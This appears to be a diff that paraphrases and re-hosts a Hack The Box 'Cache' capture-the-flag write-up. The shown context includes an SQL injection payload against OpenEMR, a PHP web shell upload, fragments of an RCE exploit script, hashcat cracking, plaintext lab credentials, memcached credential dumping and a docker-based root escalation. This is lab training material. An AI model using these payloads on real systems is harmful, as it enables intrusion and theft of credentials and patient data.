@@ -6,9 +6,9 @@ points: 30
 rating: 3.8
 date: 2020-05-09
 avatar: assets/htb/cache.png
-source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Cache
 ---
+
 ## Enumeration
 
 ### Nmap scan
@@ -34,11 +34,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 35.10 seconds
 ```
 
-I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output with a filename of `<name>`.
+I kicked things off with an nmap scan against `<YOUR_IP>`. My usual flags are: `-p-` to cover every port, `-sC` (the same as `--script=default`) to fire nmap's default enumeration scripts at the host, `-sV` for service version detection, and `-oN <name>` to write the results to a file called `<name>`.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-cache.htb.png)
+![](assets/wu/cache/img-1.png)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2.5-author-john.png)
+![](assets/wu/cache/img-2.png)
 
 [http://<YOUR_IP>/contactus.html?firstname=test&lastname=test&country=australia&subject=%3Cscript%3Ealert%28%22test%22%29%3C%2Fscript%3E\#](http://<YOUR_IP>/contactus.html?firstname=test&lastname=test&country=australia&subject=%3Cscript%3Ealert%28%22test%22%29%3C%2Fscript%3E#)
 
@@ -74,11 +74,11 @@ message submission results in url
 
 login.html seems to be rabbit hole. Never attempts to actually send data. 
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-net.html.png)
+![](assets/wu/cache/img-4.png)
 
 bypassing the page by loading `net.html` seen in the source leads to "under construction" page.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-under-construction.png)
+![](assets/wu/cache/img-5.png)
 
 ```text
 HTTP/1.1 200 OK
@@ -111,13 +111,13 @@ body  {
 </html>
 ```
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4.5-jquery-functionality.png)
+![](assets/wu/cache/img-6.png)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5.5-jquery.png)
+![](assets/wu/cache/img-7.png)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-functionality.png)
+![](assets/wu/cache/img-8.png)
 
-found some credentials in the `functionality.js` file in the `/jquery` folder. `ash:H@v3_fun` This enabled me to login to the site, which I had already discovered to hold nothing useful. This password did not work for logging into SSH. I decided to try to use my `cewl` wordlist to see if I could enumerate a proper password now that I had a username. Nothing came back.
+I spotted a set of credentials inside `functionality.js`, located in the `/jquery` directory: `ash:H@v3_fun`. They let me log into the site, but I'd already established that the site contained nothing of value. The password was rejected for SSH. With a username in hand, I then ran my `cewl` wordlist hoping to brute force a valid password, but came up empty.
 
 Next I tried enumerating subdomains using virtual host enumeration as described in the HTB machine [Forwardslash](https://kac0.gitbook.io/htb-writeups/linux-machines/hard/forwardslash-write-up#virtual-host-enumeration)
 
@@ -157,7 +157,7 @@ Found: sklep_test.cache.htb (Status: 400) [Size: 422]
 ===============================================================
 ```
 
-I wasn't sure if any of these were useful \(or reachable, rather\) so I loaded up a bunch of other wordlists to try again until I got something that looked useful.
+None of these looked useful (or, more accurately, reachable), so I cycled through a number of other wordlists, repeating the run until something more promising turned up.
 
 ```text
 kac0@kali:~/htb/cache$ gobuster vhost -u http://cache.htb -w /usr/share/seclists/Discovery/DNS/
@@ -208,7 +208,7 @@ Found: *.cache.htb (Status: 400) [Size: 422]
 ===============================================================
 ```
 
-All of these 400 errors were somewhat promising since those sites seem to exist but my requests to them aren't correct.
+These 400 responses were mildly encouraging, since they suggested the hosts do exist and my requests just weren't being formed correctly.
 
 ```text
 kac0@kali:~/htb/cache$ wfuzz --hh 8193 -w /home/kac0/htb/cache/cache.cewl -H "Host: FUZZ.htb" http://<YOUR_IP>
@@ -236,9 +236,9 @@ Filtered Requests: 1216
 Requests/sec.: 190.7288
 ```
 
-`--hh 8193` filters out replies that are 8193 chars long, which was what it replied for pretty much everything, even if it didn't exist.
+`--hh 8193` discards any 8193-character response, which is what the server returned for nearly everything regardless of whether the host actually existed.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-openemr.png)
+![](assets/wu/cache/img-9.png)
 
 add to hosts navigating to `http://hms.htb` redirects to a login page at `http://hms.htb/interface/login/login.php?site=default` the creds from the previous site do not work here
 
@@ -246,35 +246,35 @@ add to hosts navigating to `http://hms.htb` redirects to a login page at `http:/
 
 [https://labs.bishopfox.com/advisories/openemr-5-0-16-remote-code-execution-cross-site-scripting\#Arbitrary](https://labs.bishopfox.com/advisories/openemr-5-0-16-remote-code-execution-cross-site-scripting#Arbitrary)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/12-hms-dirbuster.png)
+![](assets/wu/cache/img-10.png)
 
 ran dirbuster: shows admin.php 
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-hms-admin.php.png)
+![](assets/wu/cache/img-11.png)
 
 which shows the version of this site. \(5.0.1\(3\)\) Searching for a vulnerability for this site leads to CVE-2019-8371 [https://www.cvedetails.com/cve/CVE-2019-8371/](https://www.cvedetails.com/cve/CVE-2019-8371/) 
 
 ![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/29-vuln-reportpdf%2520%25281%2529.png)
 
-There is also a vulnerability report that I found that deals with this specific version \(5.0.1.3\). [https://www.open-emr.org/wiki/images/1/11/Openemr\_insecurity.pdf](https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf) This report details `admin.php`=unauthenticated user will be prompted with the database name, the site ID as well as the current version of OpenEMR.
+I also turned up a vulnerability report covering this exact version \(5.0.1.3\). [https://www.open-emr.org/wiki/images/1/11/Openemr\_insecurity.pdf](https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf) Per the report, `admin.php` will show an unauthenticated visitor the database name, the site ID, and the running OpenEMR version.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/13-sql-patch.png)
+![](assets/wu/cache/img-13.png)
 
 `sql_patch.php`=reveals current patch level "OpenEMR Version = 5.0.1\(3\)"
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-hms-public.png)
+![](assets/wu/cache/img-14.png)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-setup.png)
+![](assets/wu/cache/img-15.png)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/14-register.png)
+![](assets/wu/cache/img-16.png)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/15-messaging.png)
+![](assets/wu/cache/img-17.png)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/16-secure-chat.png)
+![](assets/wu/cache/img-18.png)
 
-Since the patient portal didnt seem to reveal any useful information, I moved on to the next section, SQL injection. The first example sounded interesting, because combined with the patient portal bypass, I could use the authenticated SQLi vulnerability.
+The patient portal didn't appear to hold anything useful, so I moved on to the SQL injection section. The first example caught my eye since, paired with the patient portal bypass, I'd be able to leverage the authenticated SQLi flaw.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/17-duplicate-query.png)
+![](assets/wu/cache/img-19.png)
 
 ```text
 http://hms.htb/portal/find_appt_popup_user.php?catid=1' AND (SELECT 0 FROM(SELECT COUNT(*),CONCAT(@@VERSION,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- -
@@ -532,7 +532,7 @@ Database: openemr
 +---------------------------------------+
 ```
 
-Next I dumped the user\_secure table because that sounded quite promising. I also tried dumping other interesting sounding tables such as `notes` and `users_facility` but they were empty.
+The `user_secure` table sounded the most promising, so I dumped it first. I also pulled a few other interesting-looking tables like `notes` and `users_facility`, but those turned out to be empty.
 
 insert table data
 
@@ -550,7 +550,7 @@ Table: users_secure
 ```
 ```
 
-The table contained information about a `openemr_admin` user, including a bcrypt hashed password. I loaded the hash into hashcat and it cracked almost imediately.
+The table held a record for the `openemr_admin` account, complete with a bcrypt password hash. I fed the hash to hashcat and it fell almost instantly.
 
 ```text
 kac0@kali:~/htb/cache/results/<YOUR_IP>/scans$ hashcat -m 3200 -a 0 '$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.' /home/kac0/rockyou_utf8.txt 
@@ -595,17 +595,17 @@ Started: Mon Aug 10 09:35:21 2020
 Stopped: Mon Aug 10 09:35:25 2020
 ```
 
-This was one lazy admin. The password was `xxxxxx`.
+A textbook lazy admin: the password came back as `xxxxxx`.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/19-login.png)
+![](assets/wu/cache/img-21.png)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/20-administrator-portal.png)
+![](assets/wu/cache/img-22.png)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/21-acl.png)
+![](assets/wu/cache/img-23.png)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/22-users.png)
+![](assets/wu/cache/img-24.png)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/23-file-upload.png)
+![](assets/wu/cache/img-25.png)
 
 can edit files in `/var/www/hms.htb/public_html/sites/default`
 
@@ -616,13 +616,13 @@ according to vulnerability report pdf can read and write arbitrary files on the 
 
   on the page `/portal/import_template.php`
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/25-burp-rce-upload.png)
+![](assets/wu/cache/img-26.png)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/26-rce.png)
+![](assets/wu/cache/img-27.png)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/24-etc-passwd.png)
+![](assets/wu/cache/img-28.png)
 
-Got `/etc/passwd`, can see that `luffy`, `ash`, and `root` are the only users that can log in. Played around with running commands with a simple shell, then remembered that I had downloaded a python exploit that required authentication to the portal to work. `mode=save&docid=rce.php&content=<?php system($_GET["evil"]); ?>`
+Pulling `/etc/passwd` showed that only `luffy`, `ash`, and `root` have login shells. After messing around running commands through a basic shell, I recalled the python exploit I'd downloaded that needs portal authentication to function. `mode=save&docid=rce.php&content=<?php system($_GET["evil"]); ?>`
 
 ```python
 # Title: OpenEMR 5.0.1 - Remote Code Execution
@@ -807,7 +807,7 @@ rev_shell = s.get("http://hms.htb/portal/shell.php")
 print (rev_shell.text)
 ```
 
-Now that I had valid credentials to the portal, I could use exploit.py from earlier POC - modified a bit to work in this situation. After taking a bit to upload the file, a shell was returned to me
+With working portal credentials in hand, I could run the earlier PoC exploit.py, tweaked slightly to fit this scenario. The upload took a moment, after which a shell landed back on my listener.
 
 ## Initial Foothold
 
@@ -950,7 +950,7 @@ ash@cache:/dev/shm$ ip a
 memcache   959  0.0  0.1 425792  4168 ?        Ssl  13:01   0:03 /usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1 -P /var/run/memcached/memcached.pid
 ```
 
-Saw memcached in running processes with `ps aux`. didn't have much experience with it before so I started doing some reading to see if there were any privesc routes by using it. It was running on default port 11211. _It also stuck out a bit to me because of the `cache` theme on the box!_
+A `ps aux` revealed memcached among the running processes. Having little prior experience with it, I read up to find out whether it offered any privesc avenues. It was listening on the default port 11211. _It also caught my attention given the box's `cache` theme!_
 
 [https://book.hacktricks.xyz/pentesting/11211-memcache](https://book.hacktricks.xyz/pentesting/11211-memcache) memcached ash@cache:/dev/shm$ echo "version" \| nc -vn 127.0.0.1 11211 Connection to 127.0.0.1 11211 port \[tcp/\*\] succeeded! VERSION 1.5.6 Ubuntu
 
@@ -1072,7 +1072,7 @@ END
 ^C
 ```
 
-echoing a command to the service running seemed a bit awkward, so I tried running the command like `memcached stats`. It seemed to be doing something, but waited for a long time. I did some more reading and found that you could use telnet to interact with it. _\(I should have tried that on my own...if nc can interact then ssh and telnet should be able to...\)_
+Piping commands into the service felt clumsy, so I tried invoking it as `memcached stats` instead. It seemed to do something but hung for ages. More reading revealed that telnet works fine for talking to it. _\(I should have figured that out myself...if nc can talk to it, so can ssh and telnet...\)_
 
 [https://niiconsulting.com/checkmate/2013/05/memcache-exploit/](https://niiconsulting.com/checkmate/2013/05/memcache-exploit/) [https://www.hackingarticles.in/penetration-testing-on-memcached-server/](https://www.hackingarticles.in/penetration-testing-on-memcached-server/)
 
@@ -1110,7 +1110,7 @@ afhj556uo
 END
 ```
 
-using `luffy:0n3_p1ec3` was able to ssh in as `luffy`!
+with `luffy:0n3_p1ec3` I was able to ssh in as `luffy`!
 
 ## Enumeration as `luffy`
 
@@ -1119,7 +1119,7 @@ luffy@cache:/dev/shm$ id
 uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)
 ```
 
-Hmm docker...I saw that running on 172.17.0.1 earlier but wasnt able to connect. Using luffy's creds however I was able to SSH in to the docker container. confusingly...the docker container was also named `cache` so at first it looked like I had just logged back into the same machine.
+Interesting, docker...I'd noticed it on 172.17.0.1 earlier but couldn't reach it. With luffy's credentials, though, I managed to SSH into the docker container. Oddly, the container was also called `cache`, so initially it seemed like I'd simply logged back into the same host.
 
 [https://gtfobins.github.io/gtfobins/docker/](https://gtfobins.github.io/gtfobins/docker/)
 
@@ -1139,7 +1139,7 @@ REPOSITORY          TAG                 IMAGE ID            CREATED             
 ubuntu              latest              2ca708c1c9cc        10 months ago       64.2MB
 ```
 
-None of the pages I looked at explained the 'alpine' part of the command, but it looked like the name of the docker image. after trying `cache` and getting an error, I looked in the man page for how to get the image name and came up with `docker images`. The name of this docker container was `2ca708c1c9cc`. Now I could run my command to escalate to root. `docker run -v /:/mnt --rm -it --privileged 2ca708c1c9cc chroot /mnt sh`
+None of the references I read clarified the 'alpine' portion of the command, though it appeared to be the docker image name. After `cache` threw an error, I checked the man page for how to list image names and landed on `docker images`. This container's image was `2ca708c1c9cc`, so I could now run the command to escalate to root. `docker run -v /:/mnt --rm -it --privileged 2ca708c1c9cc chroot /mnt sh`
 
 ### Root.txt
 
